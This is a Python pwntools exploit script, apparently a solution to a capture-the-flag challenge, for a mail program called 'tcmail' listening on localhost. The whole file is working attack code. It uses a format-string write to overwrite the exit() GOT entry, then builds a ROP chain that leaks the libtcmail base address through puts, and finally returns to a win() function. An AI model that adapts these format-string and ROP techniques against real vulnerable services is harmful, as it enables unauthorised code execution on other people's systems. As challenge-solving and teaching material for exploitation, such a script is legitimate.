from pwn import *

elf = context.binary = ELF('../src/tcmail')
lib = ELF('../src/libtcmail.so')

#p = process()
p = remote("localhost", 3992)
#pause()

def sendMail(idx, payload):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b'> ', idx)
	p.sendafter(b'> ', payload)

def readMail(idx):
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'> ', idx)

def writeTwoBytesToAddress(addr, val):
	sendMail(b'3', b'%*15$x%1')
	sendMail(b'2', b'4$hn')
	sendMail(b'1', addr)
	sendMail(b'0', val)
	readMail(b'3')

# Arg no 16 for address, 17 for number of padding
# 0x0000000000401016 : add rsp, 8 ; ret
# 0x0000000000401393 : pop rdi ; ret

# First Payload: Overwrite exit()
log.info("Overwriting exit() .got.plt entry")
writeTwoBytesToAddress(p64(elf.got['exit']), p64(0x1016))

# Second Payload: Crafting ROP Chain, Leaking libtcmail base address
pop_rdi = p64(0x0000000000401393)
main_addr = p64(0x00000000004012ae)

log.info("Crafting ROP Chain")
log.info("Leaking libtcmail base address")
sendMail(b'3', pop_rdi)
sendMail(b'2', p64(elf.got["readMail"]))
sendMail(b'1', p64(elf.plt["puts"]))
sendMail(b'0', main_addr)
p.clean(0.5)
p.sendline(b'3')
p.recvline()

readMail_addr = (u64(p.recv(6).ljust(8, b'\x00')))
lib.address = readMail_addr - lib.sym['readMail']
log.success(f"Leaked libtcmail base address: {str(hex(lib.address))}")

# p.interactive()

# Third Payload: ret2win
log.info("Returning to win()")
sendMail(b'3', p64(lib.sym["win"]))
p.sendlineafter(b'> ', b'3')

p.interactive()